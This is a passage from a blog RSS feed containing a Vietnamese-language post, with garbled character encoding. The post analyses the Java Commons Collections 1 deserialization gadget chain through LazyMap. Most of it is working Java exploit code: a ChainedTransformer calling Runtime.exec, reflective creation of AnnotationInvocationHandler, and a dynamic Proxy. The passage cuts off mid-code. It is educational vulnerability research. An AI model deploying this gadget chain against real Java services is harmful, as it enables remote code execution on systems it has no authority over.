      <category domain="https://rayinaw.github.io/tags/Deserialization/">Deserialization</category>
      
      <category domain="https://rayinaw.github.io/tags/Commons-Collections/">Commons Collections</category>
      
      
      <comments>https://rayinaw.github.io/2022/12/16/CommonsCollections2/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>PhÃ¢n tÃ­ch chuá»—i Commons Collections 1 vá»›i LazyMap</title>
      <link>https://rayinaw.github.io/2022/12/15/CommonsCollections1-LazyMap/</link>
      <guid>https://rayinaw.github.io/2022/12/15/CommonsCollections1-LazyMap/</guid>
      <pubDate>Wed, 14 Dec 2022 20:48:35 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Trong bÃ i viáº¿t trÆ°á»›c mÃ¬nh Ä‘Ã£ phÃ¢n tÃ­ch lá»— há»•ng deserialization cá»§a TransformMap trong chuá»—i CC1, vÃ  trong bÃ i viáº¿t nÃ y mÃ¬nh sáº½ thá»±c hiá»‡n </description>
        
      
      
      
      <content:encoded><![CDATA[<p>Trong bÃ i viáº¿t trÆ°á»›c mÃ¬nh Ä‘Ã£ phÃ¢n tÃ­ch lá»— há»•ng deserialization cá»§a TransformMap trong chuá»—i CC1, vÃ  trong bÃ i viáº¿t nÃ y mÃ¬nh sáº½ thá»±c hiá»‡n deserialization theo hÆ°á»›ng cá»§a lá»›p LazyMap.</p><h2 id="Phan-tich"><a href="#Phan-tich" class="headerlink" title="PhÃ¢n tÃ­ch"></a>PhÃ¢n tÃ­ch</h2><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/mindmap.png"></p><h3 id="InvokeTransformer"><a href="#InvokeTransformer" class="headerlink" title="InvokeTransformer"></a>InvokeTransformer</h3><p>Pháº§n Ä‘uÃ´i cá»§a chuá»—i nÃ y cÅ©ng tÆ°Æ¡ng tá»± nhÆ° chuá»—i trÆ°á»›c lÃ  <code>InvokerTransformer</code>, mÃ¬nh sáº½ khÃ´ng phÃ¢n tÃ­ch láº¡i lá»›p nÃ y. NhÆ° bÃ i viáº¿t trÆ°á»›c Ä‘Ã£ nÃ³i chÃºng ta cáº§n tÃ¬m lá»›p gá»i Ä‘áº¿n phÆ°Æ¡ng thá»©c transform cá»§a lá»›p InvokerTransformer.</p><p><code>Ctrl + Chuá»™t trÃ¡i</code> click vÃ o phÆ°Æ¡ng thá»©c transform</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/ClassesCallMethodTransform.png"></p><p>PhÆ°Æ¡ng thá»©c nÃ y Ä‘Æ°á»£c sá»­ dá»¥ng á»Ÿ LazyMap.get()</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/12/15/CommonsCollections1-LazyMap/LazyMap-Get.png"></p><p>Xem <code>factory</code> lÃ  gÃ¬ nÃ o~</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Factory method to create a lazily instantiated map.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> factory  the factory to use, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException if map or factory is null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//-----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor that wraps (not copies).</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> factory  the factory to use, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException if map or factory is null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor that wraps (not copies).</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> factory  the factory to use, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException if map or factory is null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.factory = factory;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Lá»›p nÃ y sá»­ dá»¥ng Overloading cho hÃ m táº¡o vÃ  hÃ m decorate, vÃ  á»Ÿ Ä‘Ã¢y cÃ³ kiá»ƒu truyá»n vÃ o cho factory lÃ  Transformer hoáº·c Factory, do Ä‘Ã³ chÃºng ta cÃ³ thá»ƒ truyá»n vÃ o factory má»™t Transformer rá»“i cho factory.transform(Runtime.getRuntime) nhÆ° chain trÆ°á»›c.</p><p>á» bÃ i viáº¿t trÆ°á»›c, cÃ³ má»™t váº¥n Ä‘á» gáº·p pháº£i lÃ  lá»›p Runtime khÃ´ng implements serialize vÃ  khÃ´ng thá»ƒ Ä‘iá»u khiá»ƒn Ä‘Æ°á»£c tham sá»‘ á»Ÿ trong hÃ m setValue. VÃ  chÃºng ta Ä‘Ã£ tháº¥y Ä‘Æ°á»£c cÃ¡i tiá»‡n lá»£i cá»§a lá»›p ChainedTransformer vÃ  ConstantTransformer. NÃªn mÃ¬nh sáº½ sá»­ dá»¥ng láº¡i Ä‘oáº¡n nÃ y Ä‘á»ƒ bá» Ä‘i má»™t vÃ i bÆ°á»›c khÃ´ng cáº§n thiáº¿t.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span></span><br><span class="line">                        , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        lazyMap.get(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/12/15/CommonsCollections1-LazyMap/LazyMap-Get.png"></p><p>ÄÃ£ má»Ÿ Ä‘Æ°á»£c mÃ¡y tÃ­nh. Tuy nhiÃªn nhÆ° tháº¿ váº«n chÆ°a Ä‘á»§, chÃºng ta cáº§n tÃ¬m lá»›p nÃ o gá»i Ä‘áº¿n phÆ°Æ¡ng thá»©c LazyMap.get(). VÃ  vá»›i chuá»—i nÃ y, chÃºng ta sáº½ táº­p trung Ä‘áº¿n lá»›p <code>AnnotationInvocationHandler</code>.</p><h3 id="AnnotationInvocationHandler-invoke"><a href="#AnnotationInvocationHandler-invoke" class="headerlink" title="AnnotationInvocationHandler.invoke()"></a>AnnotationInvocationHandler.invoke()</h3><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/12/15/CommonsCollections1-LazyMap/AnnotationInvocationHandler-invoke.png"></p><p>Trong hÃ m invoke cá»§a <code>AnnotationInvocationHandler</code> cÃ³ dÃ²ng thá»±c hiá»‡n phÆ°Æ¡ng thá»©c get <code>Object var6 = this.memberValues.get(var4);</code>:</p><ul><li><code>this.memberValues</code> á»Ÿ Ä‘Ã¢y lÃ  má»™t map, chÃºng ta cÃ³ thá»ƒ cast nÃ³ sang LazyMap Ä‘á»ƒ lá»£i dá»¥ng LazyMap.get().</li><li>NhÆ° bÃ i viáº¿t trÆ°á»›c Ä‘Ã£ nÃ³i, lá»›p nÃ y lÃ  lá»›p kiá»ƒu default vÃ  constructor cÅ©ng lÃ  default nÃªn chÃºng ta pháº£i khá»Ÿi táº¡o nÃ³ báº±ng Reflection.</li></ul><p>Äoáº¡n code khá»Ÿi táº¡o má»™t AnnotationInvocationHandler, chá»‰ dá»«ng á»Ÿ viá»‡c khá»Ÿi táº¡o vÃ  mÃ¬nh chÆ°a lÃ m nhá»¯ng bÆ°á»›c tiáº¿p theo.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class), </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span></span><br><span class="line">                        , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="comment">//lazyMap.get(null);</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Object.class);</span><br><span class="line">        aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">aihObject</span> <span class="operator">=</span> aihClassConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line">        <span class="comment">//InvocationHandler aihObject = (InvocationHandler) aihConstructor.newInstance(Override.class, lazyMap);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Lá»›p nÃ y Ä‘Ã£ implements Serializable vÃ  cÃ³ phÆ°Æ¡ng thá»©c readObject(). NÃªn Ä‘iá»u mÃ  chÃºng ta cáº§n tiáº¿p theo lÃ  lÃ m sao Ä‘á»ƒ lá»›p nÃ y thá»±c hiá»‡n hÃ m invoke() trong phÆ°Æ¡ng thá»©c readObject(). VÃ  Ä‘á»ƒ thá»±c hiá»‡n Ä‘iá»u nÃ y chÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng Proxy Ä‘á»™ng.</p><h3 id="Dynamic-Proxy"><a href="#Dynamic-Proxy" class="headerlink" title="Dynamic Proxy"></a>Dynamic Proxy</h3><p>CÃ¡c phÆ°Æ¡ng thá»©c gá»‘c cá»§a lá»›p gá»‘c Ä‘Ã£ Ä‘Æ°á»£c ghi Ä‘Ã¨ báº±ng proxy, khi chÃºng ta thá»±c hiá»‡n má»™t phÆ°Æ¡ng thá»©c cá»§a lá»›p Ä‘Ã³ thÃ´ng qua proxy, proxy sáº½ gá»i Ä‘áº¿n hÃ m invoke rá»“i invoke phÆ°Æ¡ng thá»©c cá»§a lá»›p nÃ y. Äá»ƒ hiá»ƒu thÃªm thÃ¬ cÃ¡c báº¡n hÃ£y Ä‘á»c thÃªm vá» Dynamic Proxy trong Java.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Táº¡o má»™t InvocationHandler Ä‘á»ƒ Ä‘iá»u khiá»ƒn phÆ°Æ¡ng thá»©c cá»§a lá»›p gá»‘c.</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">aihObject</span> <span class="operator">=</span> (InvocationHandler) aihConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line"><span class="comment">//Táº¡o má»™t proxyMap Ä‘á»ƒ gá»i phÆ°Æ¡ng thá»©c</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(aihClass.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,aihInstance);</span><br></pre></td></tr></table></figure><p>BÃ¢y giá» khi chÃºng ta gá»i báº¥t kÃ¬ phÆ°Æ¡ng thá»©c nÃ o cá»§a proxyMap tÆ°Æ¡ng á»©ng vá»›i phÆ°Æ¡ng thá»©c cá»§a lazyMap, nÃ³ sáº½ gá»i Ä‘áº¿n phÆ°Æ¡ng thá»©c invoke vÃ  thá»±c thi lazyMap.get() nhÆ° mÃ¬nh Ä‘Ã£ phÃ¢n tÃ­ch á»Ÿ trÃªn.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class), </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span></span><br><span class="line">                        , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="comment">//lazyMap.get(null);</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aihInstance</span> <span class="operator">=</span> (InvocationHandler) aihConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(aihClass.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,aihInstance);</span><br><span class="line">        <span class="type">Set</span> <span class="variable">set</span> <span class="operator">=</span> proxyMap.entrySet();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Chuoi-hoan-chinh"><a href="#Chuoi-hoan-chinh" class="headerlink" title="Chuá»—i hoÃ n chá»‰nh"></a>Chuá»—i hoÃ n chá»‰nh</h3><p>Äá»ƒ Ã½ má»™t chÃºt á»Ÿ hÃ m readObject cá»§a lá»›p <code>AnnotationInvocationHandler</code></p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/12/15/CommonsCollections1-LazyMap/AnnotationInvocationHandler-readObject.png"></p><p><code>this.memberValues</code> lÃ  LazyMap chÃºng ta cÃ³ thá»ƒ truyá»n vÃ o, vÃ  nÃ³ gá»i Ä‘áº¿n entrySet(). Do Ä‘Ã³ khi readObject cá»§a lá»›p <code>AnnotationInvocationHandler</code> thá»±c thi chÃºng ta cÃ³ thá»ƒ kÃ­ch hoáº¡t cÃ¢u lá»‡nh calc.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td 